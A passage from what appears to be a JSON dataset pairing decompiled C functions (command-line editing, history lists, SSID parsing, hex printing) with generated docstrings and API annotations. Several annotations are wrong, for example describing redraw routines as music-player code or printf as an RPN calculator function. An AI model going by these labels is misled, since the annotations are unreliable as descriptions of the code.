            "(",
            "unsigned",
            "__int8",
            ")",
            "base_4096",
            "+",
            "(",
            "c",
            ">",
            ">",
            "4",
            ")",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load1",
            "(",
            "&",
            "base_4096",
            "[",
            "c",
            ">",
            ">",
            "4",
            "]",
            ")",
            ";",
            "}",
            "ft_putchar",
            "(",
            "*",
            "v1",
            ")",
            ";",
            "v2",
            "=",
            "&",
            "base_4096",
            "[",
            "c",
            "&",
            "0xF",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "base_4096",
            "+",
            "(",
            "c",
            "&",
            "0xF",
            ")",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load1",
            "(",
            "&",
            "base_4096",
            "[",
            "c",
            "&",
            "0xF",
            "]",
            ")",
            ";",
            "}",
            "ft_putchar",
            "(",
            "*",
            "v2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `_asan_report_load1` appears to be part of the AddressSanitizer (ASan) toolchain, responsible for reporting memory access violations of size 1 byte for debugging and analysis purposes in C/C++ programs.",
            "The function `ft_putchar` is designed to output a single character to the standard output (stdout) and increment a global counter, often used for simple character printing tasks within C programs."
        ],
        "longer_label": "The provided code is a function `h_puthex` written in C, responsible for printing hexadecimal characters to the standard output while performing AddressSanitizer checks to report any memory access violations of size 1 byte."
    },
    {
        "id": 14,
        "docstring_tokens": [
            "The",
            "code",
            "parses",
            "a",
            "given",
            "string",
            "to",
            "extract",
            "the",
            "SSID",
            "value",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "struct",
            ",",
            "returning",
            "0",
            "if",
            "successful",
            "and",
            "-1",
            "if",
            "not",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "_BYTE",
            "*",
            "v5",
            ";",
            "_BYTE",
            "*",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "=",
            "(",
            "char",
            "*",
            ")",
            "os_strdup",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "*",
            "v4",
            "=",
            "=",
            "34",
            ")",
            "{",
            "v5",
            "=",
            "(",
            "_BYTE",
            "*",
            ")",
            "os_strchr",
            "(",
            "v4",
            "+",
            "1",
            ",",
            "34L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v5",
            ")",
            "{",
            "os_free",
            "(",
            "v4",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "v5",
            "[",
            "1",
            "]",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "v5",
            "=",
            "(",
            "_BYTE",
            "*",
            ")",
            "os_strchr",
            "(",
            "v4",
            ",",
            "32L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "*",
            "v5",
            "=",
            "0",
            ";",
            "}",
            "v6",
            "=",
            "wpa_config_parse_string",
            "(",
            "v4",
            ",",
            "(",
            "__int64",
            "*",
            ")",
            "&",
            "v3",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "&",
            "&",
            "v3",
            "<",
            "=",
            "0x20",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            "=",
            "v3",
            ";",
            "os_memcpy",
            "(",
            "a2",
            ",",
            "v6",
            ",",
            "v3",
            ")",
            ";",
            "}",
            "os_free",
            "(",
            "v4",
            ")",
            ";",
            "os_free",
            "(",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read an unsigned 64-bit integer from the segment selector register pointed to by the FS segment register, often employed in low-level programming for accessing thread information or system-specific data structures on Windows, especially in x86 and x64 architectures.",
            "The \"os_strdup\" function is used to duplicate a given string and return an allocated buffer with the copied string, or NULL if the duplication fails, and the caller is responsible for freeing the allocated buffer.",
            "The function `os_strch` is likely a custom implementation of the standard C library function `strchr`, used for finding the first occurrence of a specified character in a string and returning a pointer to it, with variations tailored to the needs of the given code snippets, such as handling URLs and parsing data buffers.",
            "The function `os_free` is part of a system memory management module, designed to release memory allocated by corresponding allocation functions like `os_malloc`, `os_calloc`, `os_realloc`, or `os_strdup`, and it's intended to be used in conjunction with these functions to manage memory resources efficiently.",
            "The function \"os_strchr\" is intended to locate the first occurrence of a specific character within a given string and return a pointer to that character, or NULL if the character is not found.",
            "The function \"config\" is used to define and configure settings, options, and features in various software and utilities, such as network connections, X11 window systems, and server configurations.",
            "The function `parse_` appears to be part of a lexical analysis and parsing system, possibly for handling commands or parsing specific file formats, utilizing structures and callbacks for processing input data.",
            "The `os_memcpy` function is likely intended for copying a specified number of bytes from a source memory location to a destination memory location, with `destSize` potentially being used as a safety measure to prevent buffer overflows."
        ],
        "longer_label": "The code likely parses and extracts data from a given string, using low-level system-specific functions for memory allocation and manipulation, and custom implementations of standard string operations, such as finding the first occurrence of a specified character."
    },
    {
        "id": 15,
        "docstring_tokens": [
            "This",
            "code",
            "adds",
            "a",
            "new",
            "item",
            "to",
            "a",
            "double",
            "linked",
            "list",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "_QWORD",
            "*",
            "a2",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "*",
            "a2",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            ";",
            "a2",
            "[",
            "1",
            "]",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "8L",
            "L",
            ")",
            "=",
            "a2",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "=",
            "a2",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function appears to be a part of a larger program, possibly related to managing playlists in a media player or music application, as it includes structures for playlists, tracks, and windows."
        ],
        "longer_label": "The provided code likely represents a function for adding an element to a doubly linked list data structure used in a program, potentially associated with managing playlists or tracks in a media player application, as it manipulates pointers within playlist structures."
    },
    {
        "id": 16,
        "docstring_tokens": [
            "This",
            "code",
            "clears",
            "the",
            "current",
            "line",
            "by",
            "moving",
            "the",
            "cursor",
            "to",
            "the",
            "beginning",
            ",",
            "and",
            "then",
            "prints",
            "spaces",
            "to",
            "overwrite",
            "any",
            "existing",
            "characters",
            "on",
            "the",
            "line",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "int",
            "v1",
            ";",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "putchar",
            "(",
            "13",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v0",
            "=",
            "cmdbuf_len",
            "+",
            "2",
            ";",
            "v1",
            "=",
            "ps2",
            "?",
            "os_strlen",
            "(",
            "ps2",
            ")",
            ":",
            "0",
            ";",
            "result",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v0",
            "+",
            "v1",
            ")",
            ";",
            "if",
            "(",
            "i",
            ">",
            "=",
            "(",
            "int",
            ")",
            "result",
            ")",
            "break",
            ";",
            "putchar",
            "(",
            "32",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The putchar function is used to output a single character to the screen or console in a low-level programming environment, typically using assembly language or other low-level operations.",
            "The _strlen function is designed to calculate the length of a string, which is then utilized within the _puts function to determine the number of characters to write to standard output."
        ],
        "longer_label": "The code utilizes the putchar function to output a carriage return character, followed by a for loop that calculates the combined length of two variables, and then outputs a space character for each iteration until the total length is reached."
    },
    {
        "id": 17,
        "docstring_tokens": [
            "This",
            "function",
            "moves",
            "the",
            "cursor",
            "position",
            "to",
            "the",
            "left",
            "in",
            "the",
            "command",
            "buffer",
            "if",
            "it",
            "is",
            "greater",
            "than",
            "0",
            "and",
            "redraws",
            "the",
            "edit",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_pos",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            ">",
            "0",
            ")",
            "{",
            "-",
            "-",
            "cmdbuf_pos",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_redraw` function appears to be part of a user interface library or framework, likely for a terminal-based application, responsible for redrawing elements such as buttons or tracks based on internal state changes or user interactions."
        ],
        "longer_label": "The provided code snippet defines a function `move_left()` which decrements a position variable `cmdbuf_pos` and then invokes a function `edit_redraw()` likely responsible for redrawing elements, returning the updated position or the original position if it cannot move left further."
    },
    {
        "id": 18,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "moves",
            "the",
            "cursor",
            "to",
            "the",
            "right",
            "within",
            "a",
            "command",
            "buffer",
            "if",
            "the",
            "current",
            "position",
            "is",
            "less",
            "than",
            "the",
            "buffer",
            "length",
            ",",
            "and",
            "then",
            "redraws",
            "the",
            "buffer",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_len",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            "<",
            "cmdbuf_len",
            ")",
            "{",
            "+",
            "+",
            "cmdbuf_pos",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"return\" likely serves as an analysis task command for extracting relevant information or performing operations on provided code snippets, possibly focusing on handling device interception, graphics rendering, and basic program execution.",
            "The `_redraw` function appears to be responsible for updating the display of a user interface element, likely involving buttons or tracks, by iterating through each element and redrawing it accordingly based on its current state or data."
        ],
        "longer_label": "The given code likely represents a function to move the cursor right within a command buffer, with the return value potentially triggering a UI element redraw operation."
    },
    {
        "id": 19,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "move_word_left",
            "`",
            "moves",
            "the",
            "cursor",
            "to",
            "the",
            "left",
            "until",
            "it",
            "reaches",
            "the",
            "beginning",
            "of",
            "a",
            "word",
            "in",
            "the",
            "command",
            "buffer",
            "and",
            "then",
            "triggers",
            "a",
            "redraw",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "while",
            "(",
            "cmdbuf_pos",
            ">",
            "0",
            "&",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "-",
            "1",
            "]",
            "=",
            "=",
            "32",
            ")",
            "-",
            "-",
            "cmdbuf_pos",
            ";",
            "while",
            "(",
            "cmdbuf_pos",
            ">",
            "0",
            "&",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "-",
            "1",
            "]",
            "!",
            "=",
            "32",
            ")",
            "-",
            "-",
            "cmdbuf_pos",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_redraw` function appears to be responsible for redrawing elements such as buttons or tracks in a graphical user interface (GUI) or terminal interface, likely within a music player or similar application, by iterating over elements and invoking a drawing function `_drawone` for each element."
        ],
        "longer_label": "The provided code is a function designed to move a cursor position to the left within a text buffer, likely within a music player or similar application, while also triggering a redraw of elements in the user interface."
    },
    {
        "id": 20,
        "docstring_tokens": [
            "This",
            "code",
            "moves",
            "the",
            "cursor",
            "to",
            "the",
            "right",
            "until",
            "it",
            "reaches",
            "the",
            "end",
            "of",
            "a",
            "word",
            "in",
            "a",
            "command",
            "buffer",
            "and",
            "then",
            "redraws",
            "the",
            "edited",
            "command",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "while",
            "(",
            "cmdbuf_pos",
            "<",
            "cmdbuf_len",
            "&",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            "=",
            "=",
            "32",
            ")",
            "+",
            "+",
            "cmdbuf_pos",
            ";",
            "while",
            "(",
            "cmdbuf_pos",
            "<",
            "cmdbuf_len",
            "&",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            "!",
            "=",
            "32",
            ")",
            "+",
            "+",
            "cmdbuf_pos",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_redraw` function appears to be responsible for redrawing elements such as buttons or tracks in a user interface, likely within a terminal environment, by iterating through each element and updating its display based on its current state or data."
        ],
        "longer_label": "The \"move_word_right\" function iterates through the input buffer to move the cursor to the right, skipping over any spaces, and then triggers a redraw of the user interface elements."
    },
    {
        "id": 21,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "deletes",
            "the",
            "character",
            "to",
            "the",
            "left",
            "of",
            "the",
            "cursor",
            "position",
            "in",
            "a",
            "given",
            "command",
            "buffer",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_pos",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            ")",
            "{",
            "os_memmove",
            "(",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "-",
            "1",
            "]",
            ",",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ",",
            "cmdbuf_len",
            "-",
            "cmdbuf_pos",
            ")",
            ";",
            "-",
            "-",
            "cmdbuf_pos",
            ";",
            "-",
            "-",
            "cmdbuf_len",
            ";",
            "return",
            "edit_input_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `_input_red` appears to be a part of a larger program, possibly a text editor or some form of GUI interface, responsible for implementing the redo functionality for user input actions, allowing users to redo their last action on an input buffer using the default key combination 'alt-_'."
        ],
        "longer_label": "The provided code defines a function `delete_left()` which deletes the character to the left of the cursor position in a text buffer, updates buffer length and cursor position accordingly, and triggers a redraw of the input interface, likely forming a part of a text editor or GUI interface with redo functionality."
    },
    {
        "id": 22,
        "docstring_tokens": [
            "This",
            "code",
            "deletes",
            "the",
            "character",
            "at",
            "the",
            "current",
            "cursor",
            "position",
            "in",
            "the",
            "command",
            "buffer",
            "and",
            "redraws",
            "the",
            "edited",
            "line",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_len",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            "!",
            "=",
            "cmdbuf_len",
            ")",
            "{",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "os_memmove",
            "(",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ",",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "+",
            "1",
            "]",
            ",",
            "cmdbuf_len",
            "-",
            "cmdbuf_pos",
            ")",
            ";",
            "-",
            "-",
            "cmdbuf_len",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"edit_clear_lineos_memmove\" likely clears or edits a line of memory using the memmove function, but without code snippets or further context, its specific implementation and purpose are unclear."
        ],
        "longer_label": "The delete_current function likely deletes the current character in a command buffer and redraws the edited buffer, but its specific implementation and purpose are unclear without further context."
    },
    {
        "id": 23,
        "docstring_tokens": [
            "This",
            "code",
            "deletes",
            "the",
            "previous",
            "word",
            "in",
            "the",
            "command",
            "buffer",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "i",
            ";",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "cmdbuf_pos",
            ";",
            "i",
            ">",
            "0",
            "&",
            "&",
            "cmdbuf",
            "[",
            "i",
            "-",
            "1",
            "]",
            "=",
            "=",
            "32",
            ";",
            "-",
            "-",
            "i",
            ")",
            ";",
            "while",
            "(",
            "i",
            ">",
            "0",
            "&",
            "&",
            "cmdbuf",
            "[",
            "i",
            "-",
            "1",
            "]",
            "!",
            "=",
            "32",
            ")",
            "-",
            "-",
            "i",
            ";",
            "os_memmove",
            "(",
            "&",
            "cmdbuf",
            "[",
            "i",
            "]",
            ",",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ",",
            "cmdbuf_len",
            "-",
            "cmdbuf_pos",
            ")",
            ";",
            "cmdbuf_len",
            "-",
            "=",
            "cmdbuf_pos",
            "-",
            "i",
            ";",
            "cmdbuf_pos",
            "=",
            "i",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_clear_line` function is likely intended to clear a single line or a range of lines within a terminal or renderer, as part of a broader rendering or display management system, using memory manipulation functions and possibly incorporating conditional compilation for different platforms.",
            "The `_redraw` function is likely responsible for redrawing elements such as SLK buttons, playlist tracks, and terminal colors, handling updates and ensuring visual consistency within the interface of a terminal-based application."
        ],
        "longer_label": "The delete_word function clears a line in a terminal or renderer, moves the remaining content up to remove the deleted word, and then triggers a redraw of the interface for visual consistency."
    },
    {
        "id": 24,
        "docstring_tokens": [
            "The",
            "function",
            "h_print_register",
            "prints",
            "the",
            "register",
            "status",
            "of",
            "a",
            "given",
            "process",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_process",
            "*",
            "cp",
            ")",
            "{",
            "char",
            "v1",
            ";",
            "int",
            "i",
            ";",
            "i",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"register status: [\"",
            ")",
            ";",
            "while",
            "(",
            "i",
            "<",
            "=",
            "15",
            ")",
            "{",
            "v1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "4",
            "*",
            "i",
            "+",
            "(",
            "_BYTE",
            ")",
            "cp",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v1",
            ")",
            "_asan_report_load4",
            "(",
            "&",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\" %d | \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "+",
            "+",
            "]",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"]\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is a custom implementation designed for an RPN (Reverse Polish Notation) calculator with specific operator definitions and formatting rules.",
            "The function `asan_report_load4` is likely part of a memory error detection tool, specifically designed to report violations related to loading 4 bytes of memory, such as out-of-bounds reads or uninitialized memory accesses, without causing the program to abort, allowing for detailed analysis of the issue."
        ],
        "longer_label": "The code is a function that prints the status of the registers of a process, including memory error detection for out-of-bounds reads or uninitialized memory accesses."
    },
    {
        "id": 25,
        "docstring_tokens": [
            "This",
            "code",
            "clears",
            "the",
            "left",
            "side",
            "of",
            "the",
            "command",
            "buffer",
            "by",
            "moving",
            "the",
            "contents",
            "to",
            "the",
            "right",
            "and",
            "redrawing",
            "the",
            "edited",
            "buffer",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_pos",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            ")",
            "{",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "os_memmove",
            "(",
            "cmdbuf",
            ",",
            "&",
            "cmdbuf",
            "[",
            "cmdbuf_pos",
            "]",
            ",",
            "cmdbuf_len",
            "-",
            "cmdbuf_pos",
            ")",
            ";",
            "cmdbuf_len",
            "-",
            "=",
            "cmdbuf_pos",
            ";",
            "cmdbuf_pos",
            "=",
            "0",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"edit_clear_lineos_mem\" likely clears a specific line or lines of memory, but without the provided code snippets, it's challenging to determine its exact implementation or purpose."
        ],
        "longer_label": "The provided code defines a function named `clear_left` which clears the line-oriented memory in a system or application, moving any content to the leftmost position."
    },
    {
        "id": 26,
        "docstring_tokens": [
            "This",
            "code",
            "clears",
            "the",
            "right",
            "side",
            "of",
            "the",
            "command",
            "buffer",
            "if",
            "the",
            "current",
            "position",
            "is",
            "not",
            "at",
            "the",
            "end",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "result",
            ";",
            "result",
            "=",
            "cmdbuf_len",
            ";",
            "if",
            "(",
            "cmdbuf_pos",
            "!",
            "=",
            "cmdbuf_len",
            ")",
            "{",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "cmdbuf_len",
            "=",
            "cmdbuf_pos",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"edit_clear_line\" is used to clear the input line in an interactive command-line editing environment, allowing the user to start fresh when entering a new command or input.",
            "The \"return\" function seems to be a placeholder or marker within a collection of code snippets, possibly indicating a point where a return statement or function should be implemented or connected, though the specific purpose or context is unclear without further information.",
            "The function _redraw is used to redraw the buttons and labels in a user interface, such as a menu or a playlist, by calling the _drawone function for each button or label."
        ],
        "longer_label": "The code clears the right portion of the input line in a command-line editing environment and then redraws the user interface, possibly as part of a larger collection of code snippets."
    },
    {
        "id": 27,
        "docstring_tokens": [
            "The",
            "code",
            "adds",
            "a",
            "string",
            "to",
            "a",
            "history",
            "list",
            ",",
            "updating",
            "the",
            "current",
            "history",
            "item",
            "if",
            "the",
            "string",
            "already",
            "exists",
            "in",
            "the",
            "list",
            "or",
            "creating",
            "a",
            "new",
            "history",
            "item",
            "if",
            "the",
            "list",
            "is",
            "not",
            "full",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int8",
            "*",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "__int64",
            "*",
            "i",
            ";",
            "__int64",
            "v3",
            ";",
            "__int64",
            "*",
            "v4",
            ";",
            "__int64",
            "*",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "v5",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "result",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "result",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "history_list",
            ";",
            "i",
            "!",
            "=",
            "&",
            "history_list",
            ";",
            "i",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "*",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcmp",
            "(",
            "a1",
            ",",
            "i",
            "+",
            "2",
            ")",
            ")",
            "{",
            "v4",
            "=",
            "i",
            ";",
            "break",
            ";",
            "}",
            "v5",
            "=",
            "i",
            ";",
            "+",
            "+",
            "v6",
            ";",
            "}",
            "if",
            "(",
            "v4",
            ")",
            "{",
            "dl_list_del",
            "(",
            "i",
            ")",
            ";",
            "dl_list_add",
            "(",
            "(",
            "__int64",
            ")",
            "&",
            "history_list",
            ",",
            "i",
            ")",
            ";",
            "result",
            "=",
            "(",
            "__int64",
            ")",
            "i",
            ";",
            "history_curr",
            "=",
            "(",
            "__int64",
            ")",
            "i",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v6",
            ">",
            "0x63",
            "&",
            "&",
            "v5",
            ")",
            "{",
            "dl_list_del",
            "(",
            "v5",
            ")",
            ";",
            "os_free",
            "(",
            "v5",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "os_strlen",
            "(",
            "a1",
            ")",
            ";",
            "result",
            "=",
            "os_zalloc",
            "(",
            "v7",
            "+",
            "24",
            ")",
            ";",
            "v3",
            "=",
            "result",
            ";",
            "if",
            "(",
            "result",
            ")",
            "{",
            "dl_list_add",
            "(",
            "(",
            "__int64",
            ")",
            "&",
            "history_list",
            ",",
            "(",
            "_QWORD",
            "*",
            ")",
            "result",
            ")",
            ";",
            "os_strlcpy",
            "(",
            "v3",
            "+",
            "16",
            ",",
            "a1",
            ",",
            "v7",
            "+",
            "1",
            ")",
            ";",
            "result",
            "=",
            "v3",
            ";",
            "history_curr",
            "=",
            "v3",
            ";",
            "}",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The os_strcmp function is used to compare two strings and return an integer indicating whether the first string is less than, equal to, or greater than the second string.",
            "The function `dl_list_` appears to be a generic implementation for doubly-linked lists, providing functions for initialization, pushing elements onto the list, and potentially searching through the list, often used in C programming for managing dynamic data structures efficiently.",
            "The \"list_del\" function is used to remove an entry from a doubly linked list by updating the previous and next pointers of the neighboring list entries to bypass the entry being deleted.",
            "The `os_zalloc` function is intended to allocate and zero out a block of memory of a specified size, returning a pointer to the allocated and zeroed memory or `NULL` on failure, and it's typically used in embedded systems programming where memory allocation and management are critical.",
            "The function `dl_list` likely initializes a doubly linked list data structure used for timeout management or general list operations within a network connection handling system."
        ],
        "longer_label": "The provided code is a function `history_add` that adds elements to a doubly linked list (`history_list`) based on comparisons using `os_strcmp`, updating the list if the element is found, and managing memory allocation and deallocation accordingly, while maintaining a current pointer (`history_curr`)."
    },
    {
        "id": 28,
        "docstring_tokens": [
            "This",
            "code",
            "function",
            "clears",
            "the",
            "current",
            "line",
            ",",
            "copies",
            "the",
            "content",
            "from",
            "the",
            "history",
            "buffer",
            "to",
            "the",
            "command",
            "buffer",
            ",",
            "and",
            "redraws",
            "the",
            "edited",
            "content",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "edit_clear_line",
            "(",
            ")",
            ";",
            "cmdbuf_pos",
            "=",
            "os_strlen",
            "(",
            "history_curr",
            "+",
            "16",
            ")",
            ";",
            "cmdbuf_len",
            "=",
            "cmdbuf_pos",
            ";",
            "os_memcpy",
            "(",
            "cmdbuf",
            ",",
            "history_curr",
            "+",
            "16",
            ",",
            "cmdbuf_pos",
            ")",
            ";",
            "return",
            "edit_redraw",
            "(",
            ")",
            ";",
